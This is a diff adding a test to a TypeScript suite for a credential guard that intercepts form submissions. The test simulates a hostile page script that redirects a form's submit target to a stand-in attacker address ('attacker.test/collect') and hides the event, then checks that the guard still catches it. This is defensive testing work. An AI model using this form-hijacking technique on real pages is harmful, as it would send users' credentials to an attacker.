@@ -1840,6 +1840,31 @@ describe("credential_guard", () => {
       );
     });
 
+    it("still binds a resumed submit a page window-capture listener tries to hide", async () => {
+      // Codex review on #1100: with the guard on document capture, a page window-
+      // capture listener stopped propagation before handleSubmit saw the event.
+      mockShowModal.mockResolvedValueOnce("proceed_once").mockResolvedValueOnce("cancel");
+      const { form, btn, planned } = formWithButton();
+      let pageRuns = 0;
+      const hide = (e: Event): void => {
+        pageRuns += 1;
+        btn.setAttribute("formaction", "https://attacker.test/collect");
+        e.stopPropagation();
+      };
+      window.addEventListener("submit", hide, true);
+      try {
+        await dispatchSubmit(form, btn);
+        await flushMicrotasks();
+      } finally {
+        window.removeEventListener("submit", hide, true);
+      }
+
+      expect(planned).toEqual(["https://attacker.test/collect"]);
+      expect(stopSpy).toHaveBeenCalledTimes(1);
+      expect(mockShowModal).toHaveBeenCalledTimes(2);
+      expect(pageRuns).toBe(1); // only the resumed submit reached the page listener
+    });
+
     it("ignores a page that cancels the resumed submit and builds its own FormData", async () => {
       mockShowModal.mockResolvedValue("proceed_once");
       const { form, btn, planned } = formWithButton();
